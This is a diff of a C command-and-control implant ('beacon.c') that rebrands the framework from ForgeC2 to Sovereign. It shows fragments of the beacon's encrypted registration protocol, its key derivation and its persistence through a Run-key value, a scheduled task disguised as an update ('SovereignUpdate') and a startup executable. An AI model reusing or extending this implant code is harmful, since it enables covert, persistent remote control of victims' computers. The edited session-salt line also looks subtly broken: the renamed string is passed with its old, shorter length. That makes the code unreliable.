@@ -1,11 +1,11 @@
 /* beacon.c — C implant (HTTP beacon, core tasks).
  *
- * Wire-compatible with the ForgeC2 v2 envelope:
+ * Wire-compatible with the Sovereign v2 envelope:
  *   1. register frame  {uuid,seq,ts,ecdh_pub=id_pub,id_pub,secret_id,reg_hmac}
  *      reg_hmac  = b64(HMAC-SHA256(regKey, uuid||id_pub_b64||ts_be64||seq_be64))
  *   2. verify response MAC = b64(HMAC(regKey, uuid||seq||server_pub_b64))
  *   3. session key = HKDF-SHA256(X25519(id_priv, server_pub),
- *                      salt "forgec2-session-v2", info uuid)
+ *                      salt "sovereign-session-v2", info uuid)
  *   4. encrypted frames {uuid,seq,ts,c} with c = b64(nonce12||AES-GCM(inner)),
  *      AAD = uuid || 0x00 || seq_ascii. Inner body is PLAIN JSON (the server
  *      accepts unmarked JSON; no cbor/msgpack needed).
@@ -620,7 +620,7 @@ static void free_task(ctask_t *t) {
 }
 
 /* File-transfer integrity chain (mirrors Go fileChainKey/chainPrev/commit):
- * chainKey = HKDF(regKey, salt "forgec2-filechain-v1", info "file-transfer");
+ * chainKey = HKDF(regKey, salt "sovereign-filechain-v1", info "file-transfer");
  * link = HMAC(chainKey, prev || data), hex-encoded on the wire. */
 #define CHAIN_SLOTS 32
 static void hex_encode(const BYTE *in, size_t len, char *out);
@@ -631,7 +631,7 @@ static struct { unsigned long long id; BYTE prev[32]; int used; } g_chains[CHAIN
 static int chain_key(void) {
     if (g_chainkey_ok) return 0;
     if (cng_hkdf_sha256(g_regkey, 32,
-                         (const BYTE *)"forgec2-filechain-v1", 22,
+                         (const BYTE *)"sovereign-filechain-v1", 22,
                          (const BYTE *)"file-transfer", 13,
                          g_chainkey) != 0) return -1;
     g_chainkey_ok = 1;
@@ -1208,9 +1208,9 @@ static int do_reg_delete_native(const char *key) {
 }
 
 /* C-implant persistence names mirror the Go default persistencePrefix. */
-#define CPERSIST_RUN_VALUE "ForgeC2"
-#define CPERSIST_TASK_NAME "ForgeC2Update"
-#define CPERSIST_STARTUP_FILE "ForgeC2.exe"
+#define CPERSIST_RUN_VALUE "Sovereign"
+#define CPERSIST_TASK_NAME "SovereignUpdate"
+#define CPERSIST_STARTUP_FILE "Sovereign.exe"
 
 static int self_exe_path(char *out, DWORD cap) {
     DWORD n;
@@ -3865,7 +3865,7 @@ int main(void) {
                     return 1;
                 }
             }
-            if (cng_hkdf_sha256(shared, 32, (const BYTE *)"forgec2-session-v2", 18,
+            if (cng_hkdf_sha256(shared, 32, (const BYTE *)"sovereign-session-v2", 18,
                                 (const BYTE *)g_uuid, (DWORD)strlen(g_uuid), sesskey) != 0) {
                 fprintf(stderr, "[cbeacon] session derive failed\n");
                 free(resp);
